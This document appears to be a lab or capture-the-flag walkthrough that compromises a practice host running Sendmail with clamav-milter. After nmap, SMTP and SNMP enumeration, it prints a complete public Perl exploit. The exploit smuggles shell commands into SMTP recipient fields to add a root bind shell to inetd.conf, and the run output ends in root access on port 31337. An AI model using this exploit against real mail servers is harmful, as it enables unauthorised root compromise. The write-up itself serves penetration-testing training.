____

# Exploitation Guide for ClamAV

## Summary

In this walkthrough, we'll exploit a remote command execution vulnerability in Sendmail running clamav-milter, a ClamAV filter.

## Enumeration

### Nmap

Let's begin with an `nmap` scan against all TCP ports.

```
kali@kali:~$ sudo nmap -p- 192.168.120.81
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 09:55 EDT
Nmap scan report for 192.168.120.81
Host is up (0.032s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown
```

Next, let's run an aggressive scan against the discovered open ports:

```
kali@kali:~$ sudo nmap -A -sV -p 22,25,80,139,199,445,60000 192.168.120.81
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 10:18 EDT
Nmap scan report for 192.168.120.81
Host is up (0.031s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 1.3.33 ((Debian GNU/Linux))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
139/tcp   open  tcpwrapped
199/tcp   open  smux       Linux SNMP multiplexer
445/tcp   open  tcpwrapped
60000/tcp open  ssh        OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: firewall|general purpose|proxy server|WAP|PBX
Running (JUST GUESSING): Linux 2.6.X (94%), Cisco embedded (94%), Riverbed embedded (94%), Ruckus embedded (94%), ZoneAlarm embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:cisco:sa520 cpe:/h:riverbed:steelhead_200 cpe:/h:ruckus:7363 cpe:/h:zonealarm:z100g cpe:/h:cisco:uc320w cpe:/h:cisco:rv042
Aggressive OS guesses: Cisco SA520 firewall (Linux 2.6) (94%), Linux 2.6.9 - 2.6.27 (94%), Riverbed Steelhead 200 proxy server (94%), Ruckus 7363 WAP (94%), Linux 2.6.9 (94%), Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.9 (CentOS 4.4) (94%), ZoneAlarm Z100G WAP (93%), Linux 2.6.18 (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   29.05 ms 192.168.118.1
2   29.21 ms 192.168.120.81
```

### SMTP Enumeration

Next, we'll use `netcat` to attempt to interact with the SMTP service on port 25.

```
kali@kali:~$ nc -vv 192.168.120.81 25
192.168.120.81: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.120.81] 25 (smtp) open
HELO test
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 23 Mar 2020 14:20:48 -0400; (No UCE/UBE) logging access from: [192.168.118.3](TEMP)-[192.168.118.3]
250 localhost.localdomain Hello [192.168.118.3], pleased to meet you
quit
221 2.0.0 localhost.localdomain closing connection
 sent 15, rcvd 299
kali@kali:~$
```

This enumeration revealed that the service is running `ESMTP Sendmail`.

### SNMP Enumeration

Although we did not scan for the SNMP service on UDP port 161 (UDP scans are unreliable anyhow), let's use `snmp-check` to scan for a running SNMP service on the target.

```
kali@kali:~$ snmp-check 192.168.120.94
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.120.94:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.120.94
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:33:28.71
  Uptime system                 : 00:32:46.43
  System date                   : 2020-4-28 16:22:09.0

...

  3761                  runnable              klogd                 /sbin/klogd                               
  3765                  runnable              clamd                 /usr/local/sbin/clamd                      
  3767                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3776                  runnable              inetd                 /usr/sbin/inetd
...
```

An SNMP service is running on the target, and the tool returned lots of output. Sifting through it, we discover that `clamav-milter` is running with Sendmail in `black-hole-mode`.

## Exploitation

### Remote Code Execution

A public exploit search reveals a [Remote Command Execution](https://www.exploit-db.com/exploits/4761) vulnerability.

Following the exploit, let's create the following Perl file:

```
kali@kali:~$ cat 4761.pl
#!/usr/bin/perl

use IO::Socket::INET;

print "Sendmail w/ clamav-milter Remote Root Exploit\n"; print "Copyright (C) 2007 Eliteboy\n";
if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;} print "Attacking $ARGV[0]...\n";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                PeerPort => '25',
                                Proto    => 'tcp');
print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"; print $sock "data\r\n.\r\nquit\r\n";
  while (<$sock>) {
          print;
}
```

This exploit should hopefully open a bind shell on the target on TCP port 31337. Let's give the exploit executable permissions and run it:

```
kali@kali:~$ chmod 777 4761.pl
kali@kali:~$
kali@kali:~$ ./4761.pl 192.168.120.144
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.120.144...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 3 Aug 2020 16:30:08 -0400; (No UCE/UBE) logging access from: [192.168.118.3](FAIL)-[192.168.118.3]
250-localhost.localdomain Hello [192.168.118.3], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 073KU8jk004063 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
kali@kali:~$
```

If everything worked correctly, we should now be able to connect to the target on port 31337:

```
kali@kali:~$ nc -nv 192.168.120.144 31337
(UNKNOWN) [192.168.120.144] 31337 (?) open
whoami
root
```

## Escalation

Since we've gained access as root, we don't need to escalate our privileges.
